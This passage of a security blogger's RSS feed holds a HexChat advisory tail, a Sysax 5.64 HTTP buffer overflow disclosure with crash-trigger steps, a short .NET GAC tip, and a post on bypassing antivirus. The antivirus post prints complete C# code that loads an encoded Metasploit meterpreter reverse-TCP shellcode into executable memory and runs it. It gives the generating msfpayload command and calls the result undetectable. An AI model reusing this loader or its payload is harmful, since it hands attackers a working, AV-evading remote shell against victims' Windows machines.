&lt;p&gt;It&amp;rsquo;s suggested that all users upgrade to 2.9.5 where this vulnerability has been fixed. HexChat is available here: &lt;a href=&#34;http://hexchat.org/downloads.html&#34;&gt;http://hexchat.org/downloads.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sysax 5.64 HTTP Remote Buffer Overflow</title>
      <link>https://www.mattandreko.com/2012/07/28/sysax-5.64-http-remote-buffer-overflow/</link>
      <pubDate>Sat, 28 Jul 2012 22:56:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/2012/07/28/sysax-5.64-http-remote-buffer-overflow/</guid>
      <description>&lt;p&gt;I have discovered a bug in the &lt;a href=&#34;http://sysax.com/server/index.htm&#34;&gt;Sysax Multi-Server application&lt;/a&gt;. More specifically, it&amp;rsquo;s in the HTTP File Server service, which is not enabled by default. It has to be turned on by the admin for this exploit to properly function. The user in question also needs permission to create a directory.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In the Sysax service, the configuration would look like this:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_protocols.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;To trigger this vulnerability is pretty simple. Log into the HTTP File Server:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_login.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After logging in, click the &amp;ldquo;Create Folder&amp;rdquo; link:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_main.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;In the &amp;ldquo;Folder Name&amp;rdquo; textbox, enter 1000 &amp;ldquo;A&amp;rdquo;s:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_create_folder.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The service will then crash, and have the EIP address overwritten:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_crash.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I reported this vulnerability to CodeOrigin, the creators of the Sysax Multi-Server on July 26 17:24 PM EDT. Surprisingly, they got back to me at July 27 04:28 AM PDT with a new version available (5.65).  Unfortunately this version had the same vulnerability, although the EIP offset was different. After reporting this, they got back to me again at July 28 06:59 AM PDT, stating that a new version was available (5.66). This new version appears to have the vulnerability fixed.&lt;/p&gt;

&lt;p&gt;If you&amp;rsquo;re using Sysax Multi-Server, please upgrade, to prevent attackers from infiltrating your systems.&lt;/p&gt;

&lt;p&gt;The exploit can now be found on exploit-db, &lt;a href=&#34;http://www.exploit-db.com/exploits/20676&#34;&gt;here&lt;/a&gt;, where you can also download the vulnerable version of the software.&lt;/p&gt;

&lt;p&gt;Thanks a bunch to &lt;a href=&#34;https://twitter.com/cd1zz&#34;&gt;@cd1zz&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/iMulitia&#34;&gt;@iMulitia&lt;/a&gt; for pointing me to this app!&lt;/p&gt;

&lt;p&gt;UPDATE (2012-08-19): The original exploit had an issue with a variable EIP offset, due to the fact that the root folder for the user was part of the stack.  I was able to discover a second vulnerability to get the server to disclose the path.  This has been incorporated into the new exploit, and works much better.  Sysax has released an updated version that is no longer vulnerable to this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Using .net to bypass AV</title>
      <link>https://www.mattandreko.com/2012/02/23/using-.net-to-bypass-av/</link>
      <pubDate>Thu, 23 Feb 2012 18:19:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2012/02/23/using-.net-to-bypass-av/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve read a ton of articles on bypassing Antivirus software when trying to run shellcode on machines.  There&amp;rsquo;s just a ton available.  These are just a few examples:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://dev.metasploit.com/redmine/projects/framework/wiki/Using_a_Custom_Executable_to_Bypass_AV&#34;&gt;http://dev.metasploit.com/redmine/projects/framework/wiki/Using_a_Custom_Executable_to_Bypass_AV&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.offensive-security.com/metasploit-unleashed/Antivirus_Bypass&#34;&gt;http://www.offensive-security.com/metasploit-unleashed/Antivirus_Bypass&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/bypassing-anti-virus-with-metasploit&#34;&gt;http://www.irongeek.com/i.php?page=videos/bypassing-anti-virus-with-metasploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://clshack.com/metasploit-shellcodeexec-bypassing-any-anti-virus.html&#34;&gt;http://clshack.com/metasploit-shellcodeexec-bypassing-any-anti-virus.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html&#34;&gt;http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I was recently working with some Windows web-servers, which had ASP.net enabled, but not any other useful language.  I had recently read about &lt;a href=&#34;http://www.exploit-monday.com/2011/11/powersyringe-powershell-based-codedll.html&#34;&gt;PowerSyringe&lt;/a&gt;, so I started tinkering with making some shellcode run similarly.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;I ended up finding out that I couldn&amp;rsquo;t do what I was wanting to do in ASP.net as of yet.  If someone else can find a way, please let me know.  Unfortunately, I get the error, &amp;ldquo;Attempted to read or write protected memory. This is often an indication that other memory is corrupt.&amp;rdquo;, when trying to use this in ASP.net.&lt;/p&gt;

&lt;p&gt;However, for just normal Windows applications, this is yet another great way to hide from AV.  It&amp;rsquo;s very similar to the python method, where you wrap the payload in python, and then turn it into an executable.  Take a look, and let me know of any improvements:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;using System;
using System.Runtime.InteropServices;

namespace Wrapper
{
    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport(&amp;quot;kernel32.dll&amp;quot;, SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport(&amp;quot;kernel32.dll&amp;quot;)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport(&amp;quot;kernel32&amp;quot;)]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        static void Main()
        {
            // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.105 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
            string shellcode = &amp;quot;PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIilkXK9ePePc0qpK9HeUazrU4NkrrtplKPRfllK3bdTlKsBExvoOG3zfFP1YovQyPLl5lpaCL7rDl5pzaZofmUQo7KRzPrrrwLKv2vpnkrbUleQJplKspt8K5IPt4rjs1XPf0nkpH5HLKf8gPvaxSHc5l0IlKTtlKGqzv6QyoFQIPLlzajoTMgqxGuh9pRUzTwsQmzXEkametd5kRQHNkchetGqxSRFlK4LbklK2x7lva9ClKS4lKgqXPNiG4VD6DskCkE169sjV1IoM0bxcobznkDRhkK6smbH03drEPC0qx0wRSEbsobtbH2ld7a6UW9oIEMhlPuQePePuyo4RtbpaxTik0BKc09oHUBp2pf060CpBpSpBpphxjtOkoM0YoKenwQzWurHKpMxfau9sXgr30vqClmYZF3ZTPBvqGCXj9lept3QKOZuouo0Pt6lYobns8SEHlbHxpX5Y21FKON53ZC0SZVdbvCgu8s2n9jhsoKOn5Nk6VSZCpE8S0b0C05PPVcZ30e82xLd1CiukOjuNsScCZUP1F0SV7U84BJyhH1OyoN5wqIStiHFMU9fD5hlYSAA&amp;quot;;

            byte[] sc = new byte[shellcode.Length];

            for (int i = 0; i &amp;lt; shellcode.Length; i++)
            {
                sc[i] = Convert.ToByte(shellcode[i]);
            }

            // Allocate RWX memory for the shellcode
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
            System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, &amp;quot;Error: Couldn&#39;t allocate remote memory&amp;quot;);

            try
            {
                // Copy shellcode to RWX buffer
                Marshal.Copy(sc, 0, baseAddr, sc.Length);

                // Get pointer to function created in memory
                ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

                del();
            }
            finally
            {
                VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
            }

            Console.ReadLine();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once this is compiled, it seems to currently be completely undetectable.

&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/virustotal_wrapper.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Update:&lt;/b&gt;Due to several questions, I have uploaded this to &lt;a href=&#34;https://github.com/mandreko/DotNetAVBypass&#34;&gt;GitHub&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Finding DLL files in the GAC</title>
      <link>https://www.mattandreko.com/2011/10/14/finding-dll-files-in-the-gac/</link>
      <pubDate>Fri, 14 Oct 2011 07:20:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/2011/10/14/finding-dll-files-in-the-gac/</guid>
      <description>&lt;p&gt;So last night I was working on a project where I needed a specific version of a .net assembly that was installed somewhere on my system, but I could not locate it by a common search. Whenever I would open up C:\Windows\Assembly\ I could see the file and the multiple versions that I had installed. However, from that window, you can not copy the files out. All I wanted, was to copy the file to my local source branch, and include it in source control.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;I stumbled upon an &lt;a href=&#34;http://stackoverflow.com/questions/714907/how-to-extract-an-assembly-from-the-gac/714919#714919&#34;&gt;article&lt;/a&gt; that mentioned being able to go to:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;C:\Windows\Assembly\GAC_msil&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This worked out perfectly. I found the assembly, sorted through the version numbers, and copied the dll files that I needed. My app now works marvelously.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m guessing that I could also achieve the same results, loading the assembly from the GAC using some sort of assembly binding, but I honestly haven&amp;rsquo;t looked enough into it to figure it out, and I needed these dll files in my source control in case another machine I download it to didn&amp;rsquo;t have the libraries installed, so this method worked fine for me.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>